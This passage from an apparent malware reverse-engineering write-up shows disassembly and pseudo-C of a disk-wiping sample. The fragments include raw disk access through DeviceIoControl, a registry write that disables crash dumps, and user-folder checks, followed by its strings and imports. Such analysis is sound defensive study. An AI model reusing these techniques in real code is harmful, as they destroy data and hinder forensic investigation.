00401902                  goto label_4018ed;
00401902              }
0040190c              *(int64_t*)arg3 = output_buffer;
00401910              arg3[1] = 0;
00401910          }
0040191a          if (output_buffer_count != 0)
00401918          {
00401936              int128_t output_buffer;
00401936              if (DeviceIoControl(handle_to_file, 0x700a0, nullptr, 0, &output_buffer, 0x28, &bytes_returned, nullptr) == 0)
00401934              {
00401936                  goto label_4018ed;
00401936              }
00401938              int32_t eax_3 = *(int32_t*)((char*)output_buffer)[8];
00401943              if ((eax_3 != 0xb && eax_3 != 0xc))
00401940              {
00401943                  goto label_4018ed;
00401943              }
00401949              *(int128_t*)output_buffer_count = output_buffer;
00401950              int128_t var_30;
00401950              output_buffer_count[1] = var_30;
00401959              int64_t var_20;
00401959              output_buffer_count[2] = var_20;
00401959          }
00401966          return handle_to_file;
00401966      }
00401969      GetLastError();
00401977      return handle_to_file;
00401977  }

```  

Furthermore, we can also see a registry key edited in order to disable crash dumps:  
```  

Dissassembly:  
-------------  
00402b71  lea     eax, [ebp-0x4 {var_8}]
00402b74  mov     dword [ebp-0x4 {var_8}], 0x0 // NOTE DWORD VAR SET TO ZERO
00402b7b  push    eax {var_8} {var_8c0_9}
00402b7c  push    0x4056e0 {var_8c4}  {"SYSTEM\CurrentControlSet\Control…"}
00402b81  push    0x80000002  {0x80000002}
00402b86  call    dword [RegOpenKeyW] // KEY OPENED
00402b8c  test    eax, eax
00402b8e  jne     0x402bb4

00402b90  push    0x4 {var_8c0}
00402b92  mov     dword [ebp-0xc {var_10}], eax
00402b95  lea     eax, [ebp-0xc {var_10}]
00402b98  push    eax {var_10} {var_8c4_9}
00402b99  push    0x4
00402b9b  push    0x0
00402b9d  push    0x40573c {var_8d0}  {"CrashDumpEnabled"}
00402ba2  push    dword [ebp-0x4 {var_8}] {var_8d4_1}
00402ba5  call    dword [RegSetValueExW] // REGISTRY VALUE SET TO ZERO
00402bab  push    dword [ebp-0x4 {var_8}] {var_8c0_10}
00402bae  call    dword [RegCloseKey] // KEY CLOSED


Psuedo C Code:  
--------------  
00402b74                      HKEY KeyValue = nullptr;
00402b86                      LSTATUS eax = RegOpenKeyW(0x80000002, 0x4056e0, &KeyValue);  // {"SYSTEM\CurrentControlSet\Control…"}
00402b8e                      void* var;
00402b8e                      if (eax == 0)
00402b8c                      {
00402b92                          var = eax;
00402ba5                          RegSetValueExW(KeyValue, 0x40573c, 0, 4, &var, 4);  // {"CrashDumpEnabled"}
00402bae                          RegCloseKey(KeyValue); //keyvalue set to null
00402bab                      }

```  

There are also functions searching to see if AppData, My Documents, etc exist:  
```  

Dissassembly:  
-------------  
00402920  int32_t __stdcall AppDataSearch(int32_t arg1 @ ecx, int32_t pointer_to_string_to_search, 
00402920      char* arg3)

00402920  push    ebp {__saved_ebp}
00402921  mov     ebp, esp {__saved_ebp}
00402923  push    ecx {search_value_pointer}
00402924  mov     eax, dword [ebp+0xc {arg3}]
00402927  push    ebx {__saved_ebx}  {0x0}
00402928  push    esi {__saved_esi}
00402929  push    edi {__saved_edi}
0040292a  test    byte [eax], 0x10
0040292d  mov     dword [ebp-0x4 {search_value_pointer}], 0x405264  {"AppData"}
00402934  je      0x402952

00402936  mov     edi, dword [ebp+0x8 {pointer_to_string_to_search}]
00402939  xor     esi, esi  {0x0}
0040293b  mov     ebx, dword [StrStrIW]

00402941  push    dword [ebp+esi*4-0x4 {search_value_pointer}] {var_18_1}
00402945  push    edi {var_1c_1}
00402946  call    ebx
00402948  test    eax, eax
0040294a  // Finds the first occurrence of a substring within a string. The comparison is not 
0040294a  // case-sensitive.
0040294a  jne     0x402960

0040294c  inc     esi
0040294d  cmp     esi, 0x1
00402950  jb      0x402941

00402952  pop     edi {__saved_edi}
00402953  pop     esi {__saved_esi}
00402954  mov     eax, 0x1
00402959  pop     ebx {__saved_ebx}  {0x0}
0040295a  mov     esp, ebp
0040295c  pop     ebp {__saved_ebp}
0040295d  retn    0xc {__return_addr}

00402960  pop     edi {__saved_edi}
00402961  pop     esi {__saved_esi}
00402962  xor     eax, eax  {0x0}
00402964  pop     ebx {__saved_ebx}  {0x0}
00402965  mov     esp, ebp
00402967  pop     ebp {__saved_ebp}
00402968  // returns false if ascii pattern (eg "AppData") is found
00402968  retn    0xc {__return_addr}


Psuedo C Code:  
--------------  
00402920  int32_t __stdcall AppDataSearch(int32_t arg1 @ ecx, int32_t pointer_to_string_to_search, 
00402920      char* arg3)

00402920  {
00402923      int32_t search_value_pointer = arg1;
0040292d      search_value_pointer = 0x405264;  // {"AppData"}
00402934      if ((*(int8_t*)arg3 & 0x10) != 0)
0040292a      {
00402939          int32_t esi_1 = 0;
00402950          do
00402950          {
0040294a              // Finds the first occurrence of a substring within a string. The comparison is not 
0040294a              // case-sensitive.
0040294a              if (StrStrIW(pointer_to_string_to_search, &search_value_pointer[esi_1]) != 0)
00402948              {
00402968                  return 0;  // returns false if ascii pattern (eg "AppData") is found
00402968              }
0040294c              esi_1 = (esi_1 + 1);
0040294c          } while (esi_1 < 1);
0040294d      }
0040295d      return 1;
0040295d  }

```  
  
```  

Dissassembly:  
-------------  
00402970  int32_t __stdcall MyDocsSearch(int32_t pointer_to_string_to_search, char* arg2)

00402970  push    ebp {__saved_ebp}
00402971  mov     ebp, esp {__saved_ebp}
00402973  sub     esp, 0x8
00402976  mov     eax, dword [ebp+0xc {arg2}]
00402979  push    ebx {__saved_ebx}  {0x0}
0040297a  push    esi {__saved_esi}
0040297b  push    edi {__saved_edi}
0040297c  test    byte [eax], 0x10
0040297f  mov     dword [ebp-0x8 {search_value_pointer}], 0x405274  {"My Documents"}
00402986  mov     dword [ebp-0x4 {var_8}], 0x405290  {"Desktop"}
0040298d  je      0x4029b1

0040298f  mov     edi, dword [ebp+0x8 {pointer_to_string_to_search}]
00402992  xor     esi, esi  {0x0}
00402994  mov     ebx, dword [StrStrIW]
0040299a  nop     word [eax+eax], ax

004029a0  push    dword [ebp+esi*4-0x8 {search_value_pointer}] {var_1c_1}
004029a4  push    edi {var_20_1}
004029a5  call    ebx
004029a7  test    eax, eax
004029a9  // Finds the first occurrence of a substring within a string. The comparison is not 
004029a9  // case-sensitive.
004029a9  jne     0x4029bc

004029ab  inc     esi
004029ac  cmp     esi, 0x2
004029af  jb      0x4029a0

004029b1  pop     edi {__saved_edi}
004029b2  pop     esi {__saved_esi}
004029b3  xor     eax, eax  {0x0}
004029b5  pop     ebx {__saved_ebx}  {0x0}
004029b6  mov     esp, ebp
004029b8  pop     ebp {__saved_ebp}
004029b9  retn    0xc {__return_addr}

004029bc  pop     edi {__saved_edi}
004029bd  pop     esi {__saved_esi}
004029be  mov     eax, 0x1
004029c3  pop     ebx {__saved_ebx}  {0x0}
004029c4  mov     esp, ebp
004029c6  pop     ebp {__saved_ebp}
004029c7  // returns true if ascii pattern (eg "My Documents") is found
004029c7  retn    0xc {__return_addr}


Psuedo C Code:  
-------------- 
00402970  int32_t __stdcall MyDocsSearch(int32_t pointer_to_string_to_search, char* arg2)

00402970  {
0040297f      int32_t search_value_pointer = 0x405274;  // {"My Documents"}
00402986      int32_t var_8 = 0x405290;  // {"Desktop"}
0040298d      if ((*(int8_t*)arg2 & 0x10) != 0)
0040297c      {
00402992          int32_t esi_1 = 0;
004029af          do
004029af          {
004029a9              // Finds the first occurrence of a substring within a string. The comparison is not 
004029a9              // case-sensitive.
004029a9              if (StrStrIW(pointer_to_string_to_search, &search_value_pointer[esi_1]) != 0)
004029a7              {
004029c7                  // returns true if ascii pattern (eg "My Documents") is found
004029c7                  return 1;
004029c7              }
004029ab              esi_1 = (esi_1 + 1);
004029ab          } while (esi_1 < 2);
004029ac      }
004029b9      return 0;
004029b9  }

```  
<h2>Data</h2>  
Here we can see our constants and imports.  
There are additional areas of note which seem to enunumerate or manipulate other areas of the filesystem, and we can see those areas in our constants in .rdata:  
```  

.rdata:004051A8                 text "UTF-16LE", '\\.\PhysicalDrive%u',0
.rdata:004051D0                 text "UTF-16LE", '\\.\EPMNTDRV\%u',0
.rdata:004051F0                 text "UTF-16LE", '\\.\',0
.rdata:004051FC                 text "UTF-16LE", '%s%.2s',0
.rdata:0040520C                 text "UTF-16LE", '$Bitmap',0
.rdata:0040521C                 text "UTF-16LE", '$LogFile',0
.rdata:00405230                 text "UTF-16LE", '\??\',0
.rdata:00405248                 text "UTF-16LE", 'ntuser',0
.rdata:00405264                 text "UTF-16LE", 'AppData',0
.rdata:00405274                 text "UTF-16LE", 'My Documents',0
.rdata:00405290                 text "UTF-16LE", 'Desktop',0
.rdata:004052A0                 text "UTF-16LE", '\\?\C:\Documents and Settings',0

```  

In .idata can see all imported functions (note the libraries near the top of this article). Special attention was paid to any file IO, registry editing, and service calls: 
```  

00405afc  uint32_t __import_lookup_table_5(ADVAPI32:InitiateSystemShutdownExW) = 0x6234
00405b00  uint32_t __import_lookup_table_5(ADVAPI32:ControlService) = 0x6222
00405b04  uint32_t __import_lookup_table_5(ADVAPI32:CloseServiceHandle) = 0x620c
00405b08  uint32_t __import_lookup_table_5(ADVAPI32:DeleteService) = 0x61fc
00405b0c  uint32_t __import_lookup_table_5(ADVAPI32:StartServiceW) = 0x61ec
00405b10  uint32_t __import_lookup_table_5(ADVAPI32:ChangeServiceConfigW) = 0x61d4
00405b14  uint32_t __import_lookup_table_5(ADVAPI32:QueryServiceStatus) = 0x61be
00405b18  uint32_t __import_lookup_table_5(ADVAPI32:CreateServiceW) = 0x61ac
00405b1c  uint32_t __import_lookup_table_5(ADVAPI32:OpenServiceW) = 0x619c
00405b20  uint32_t __import_lookup_table_5(ADVAPI32:OpenSCManagerW) = 0x618a
00405b24  uint32_t __import_lookup_table_5(ADVAPI32:AdjustTokenPrivileges) = 0x6172
00405b28  uint32_t __import_lookup_table_5(ADVAPI32:LookupPrivilegeValueW) = 0x615a
00405b2c  uint32_t __import_lookup_table_5(ADVAPI32:OpenProcessToken) = 0x6146
00405b30  uint32_t __import_lookup_table_5(ADVAPI32:RegDeleteKeyW) = 0x6136
00405b34  uint32_t __import_lookup_table_5(ADVAPI32:CryptReleaseContext) = 0x6120
00405b38  uint32_t __import_lookup_table_5(ADVAPI32:CryptGenRandom) = 0x610e
00405b3c  uint32_t __import_lookup_table_5(ADVAPI32:CryptAcquireContextW) = 0x60f6
00405b40  uint32_t __import_lookup_table_5(ADVAPI32:RegQueryInfoKeyW) = 0x6250
00405b44  uint32_t __import_lookup_table_5(ADVAPI32:RegEnumKeyExW) = 0x6264
00405b48  uint32_t __import_lookup_table_5(ADVAPI32:RegOpenKeyW) = 0x6274
00405b4c  uint32_t __import_lookup_table_5(ADVAPI32:RegCloseKey) = 0x6294
00405b50  uint32_t __import_lookup_table_5(ADVAPI32:RegSetValueExW) = 0x6282

00405b58  uint32_t __import_lookup_table_3(KERNEL32:HeapAlloc) = 0x5daa
00405b5c  uint32_t __import_lookup_table_3(KERNEL32:GetProcessHeap) = 0x5db6
00405b60  uint32_t __import_lookup_table_3(KERNEL32:DeviceIoControl) = 0x5dc8
00405b64  uint32_t __import_lookup_table_3(KERNEL32:GetLastError) = 0x5dda
00405b68  uint32_t __import_lookup_table_3(KERNEL32:HeapReAlloc) = 0x5dea
00405b6c  uint32_t __import_lookup_table_3(KERNEL32:HeapFree) = 0x5df8
00405b70  uint32_t __import_lookup_table_3(KERNEL32:lstrcmpA) = 0x5e04
00405b74  uint32_t __import_lookup_table_3(KERNEL32:GetSystemTimeAsFileTime) = 0x5e10
00405b78  uint32_t __import_lookup_table_3(KERNEL32:CreateFileW) = 0x5e2a
00405b7c  uint32_t __import_lookup_table_3(KERNEL32:CloseHandle) = 0x5e38
00405b80  uint32_t __import_lookup_table_3(KERNEL32:SetFilePointerEx) = 0x5e46
00405b84  uint32_t __import_lookup_table_3(KERNEL32:ReadFile) = 0x5e5a
00405b88  uint32_t __import_lookup_table_3(KERNEL32:GetDiskFreeSpaceW) = 0x5e66
00405b8c  uint32_t __import_lookup_table_3(KERNEL32:lstrlenW) = 0x5e7a
00405b90  uint32_t __import_lookup_table_3(KERNEL32:WriteFile) = 0x5e86
00405b94  uint32_t __import_lookup_table_3(KERNEL32:FlushFileBuffers) = 0x5e92
00405b98  uint32_t __import_lookup_table_3(KERNEL32:CreateThread) = 0x5ea6
00405b9c  uint32_t __import_lookup_table_3(KERNEL32:WaitForMultipleObjects) = 0x5eb6
00405ba0  uint32_t __import_lookup_table_3(KERNEL32:GetModuleHandleW) = 0x5ed0
00405ba4  uint32_t __import_lookup_table_3(KERNEL32:GetProcAddress) = 0x5ee4
00405ba8  uint32_t __import_lookup_table_3(KERNEL32:GetCurrentProcess) = 0x5ef6
00405bac  uint32_t __import_lookup_table_3(KERNEL32:VerSetConditionMask) = 0x5f0a
00405bb0  uint32_t __import_lookup_table_3(KERNEL32:VerifyVersionInfoW) = 0x5f20
00405bb4  uint32_t __import_lookup_table_3(KERNEL32:FindResourceW) = 0x5f36
00405bb8  uint32_t __import_lookup_table_3(KERNEL32:LoadResource) = 0x5f46
00405bbc  uint32_t __import_lookup_table_3(KERNEL32:LockResource) = 0x5f56
00405bc0  uint32_t __import_lookup_table_3(KERNEL32:SizeofResource) = 0x5f66
00405bc4  uint32_t __import_lookup_table_3(KERNEL32:GetSystemDirectoryW) = 0x5f78
00405bc8  uint32_t __import_lookup_table_3(KERNEL32:DeleteFileW) = 0x5f8e
00405bcc  uint32_t __import_lookup_table_3(KERNEL32:WaitForSingleObject) = 0x5fa4
00405bd0  uint32_t __import_lookup_table_3(KERNEL32:SetThreadPriority) = 0x5fba
00405bd4  uint32_t __import_lookup_table_3(KERNEL32:FindFirstFileW) = 0x5fce
00405bd8  uint32_t __import_lookup_table_3(KERNEL32:FindNextFileW) = 0x5fe0
00405bdc  uint32_t __import_lookup_table_3(KERNEL32:FindClose) = 0x5ff0
00405be0  uint32_t __import_lookup_table_3(KERNEL32:GetLogicalDriveStringsW) = 0x5ffc
00405be4  uint32_t __import_lookup_table_3(KERNEL32:SetLastError) = 0x6016
00405be8  uint32_t __import_lookup_table_3(KERNEL32:GetCommandLineW) = 0x6026
00405bec  uint32_t __import_lookup_table_3(KERNEL32:GetModuleFileNameW) = 0x6038
00405bf0  uint32_t __import_lookup_table_3(KERNEL32:GetFileAttributesW) = 0x604e
00405bf4  uint32_t __import_lookup_table_3(KERNEL32:CreateEventW) = 0x6064
00405bf8  uint32_t __import_lookup_table_3(KERNEL32:SetEvent) = 0x6074
00405bfc  uint32_t __import_lookup_table_3(KERNEL32:ExitProcess) = 0x6080
00405c00  uint32_t __import_lookup_table_3(KERNEL32:GetCurrentProcessId) = 0x608e
00405c04  uint32_t __import_lookup_table_3(KERNEL32:GetFileInformationByHandle) = 0x60a4
00405c08  uint32_t __import_lookup_table_3(KERNEL32:Sleep) = 0x5f9c

00405c10  uint32_t __import_lookup_table_1(LZ32:LZClose) = 0x5d6a
00405c14  uint32_t __import_lookup_table_1(LZ32:LZCopy) = 0x5d74
00405c18  uint32_t __import_lookup_table_1(LZ32:LZOpenFileW) = 0x5d5c

00405c20  uint32_t __import_lookup_table_6(SHELL32:CommandLineToArgvW) = 0x62b0

00405c28  uint32_t __import_lookup_table_0(SHLWAPI:StrStrW) = 0x5d46
00405c2c  uint32_t __import_lookup_table_0(SHLWAPI:StrRChrW) = 0x5d3a
00405c30  uint32_t __import_lookup_table_0(SHLWAPI:StrChrW) = 0x5d30
00405c34  uint32_t __import_lookup_table_0(SHLWAPI:StrToIntW) = 0x5d24
00405c38  uint32_t __import_lookup_table_0(SHLWAPI:PathAddExtensionW) = 0x5d10
00405c3c  uint32_t __import_lookup_table_0(SHLWAPI:PathFindExtensionW) = 0x5cfa
00405c40  uint32_t __import_lookup_table_0(SHLWAPI:PathFileExistsW) = 0x5ce8
00405c44  uint32_t __import_lookup_table_0(SHLWAPI:StrCatBuffW) = 0x5cda
00405c48  uint32_t __import_lookup_table_0(SHLWAPI:PathAddBackslashW) = 0x5cc6
00405c4c  uint32_t __import_lookup_table_0(SHLWAPI:PathAppendW) = 0x5cb8
00405c50  uint32_t __import_lookup_table_0(SHLWAPI:StrStrIW) = 0x5cac
00405c54  uint32_t __import_lookup_table_0(SHLWAPI:StrCmpNW) = 0x5ca0
00405c58  uint32_t __import_lookup_table_0(SHLWAPI:wnsprintfW) = 0x5c92
00405c5c  uint32_t __import_lookup_table_0(SHLWAPI:StrStrA) = 0x5c88

00405c64  uint32_t __import_lookup_table_4(USER32:wsprintfW) = 0x60d0
00405c68  uint32_t __import_lookup_table_4(USER32:CharLowerW) = 0x60dc

00405c70  uint32_t __import_lookup_table_2(msvcrt:towupper) = 0x5d92
00405c74  uint32_t __import_lookup_table_2(msvcrt:wcsncpy) = 0x5d88
00405c78  uint32_t __import_lookup_table_2(msvcrt:memcpy) = 0x62e6
00405c7c  uint32_t __import_lookup_table_2(msvcrt:_except_handler3) = 0x62d2
00405c80  uint32_t __import_lookup_table_2(msvcrt:memset) = 0x62f0

```  

<h2>Conclusion</h2>  
While certainly not exhaustive, hopefully this writeup provides some insight into malware analysis, reversing, and Windows internals. This was a fun exercise and involved use of IDA free, Binary Ninja (personal,) and CyberChef.  
